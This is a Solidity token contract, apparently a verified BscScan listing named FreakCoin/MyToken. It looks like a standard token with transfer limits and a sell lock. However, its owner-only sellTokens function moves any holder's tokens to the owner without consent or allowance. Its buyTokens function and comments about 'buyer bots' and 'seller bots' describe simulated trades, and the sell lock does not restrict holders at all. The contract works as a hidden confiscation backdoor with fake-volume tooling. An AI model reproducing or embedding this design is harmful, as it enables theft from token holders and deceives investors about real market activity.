/**
 *Submitted for verification at BscScan.com on 2023-03-01
*/

// File: contracts/FreakCoin.sol


pragma solidity ^0.8.0;

contract MyToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    uint256 public transferLimit;
    address public owner;
    bool public sellLocked;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event SellLocked(bool indexed locked);

    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply, uint256 _transferLimit) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply * 10 ** uint256(decimals);
        transferLimit = _transferLimit * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        sellLocked = true;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[msg.sender], "Not enough balance");
        require(_value <= transferLimit, "Transfer limit exceeded");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from], "Not enough balance");
        require(_value <= transferLimit, "Transfer limit exceeded");
        require(_value <= allowance[_from][msg.sender], "Not enough allowance");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function lockSell(bool _locked) public returns (bool success) {
        require(msg.sender == owner, "Only owner can lock/unlock sell");
        sellLocked = _locked;
        emit SellLocked(_locked);
        return true;
    }

    // Buyer bots simulate buying tokens by emitting a Transfer event
    function buyTokens(address _buyer, uint256 _value) public returns (bool success) {
        require(msg.sender == owner, "Only owner can buy tokens");
        require(!sellLocked, "Selling is locked");
        balanceOf[_buyer] += _value;
        balanceOf[owner] -= _value;
        emit Transfer(owner, _buyer, _value);
        return true;
    }

    // Seller bots simulate selling tokens by emitting a Transfer event
    function sellTokens(address _seller, uint256 _value) public returns (bool success) {
        require(msg.sender == owner, "Only owner can sell tokens");
        balanceOf[_seller] -= _value;
        balanceOf[owner] += _value;
        emit Transfer(_seller, owner, _value);
        return true;
    }
}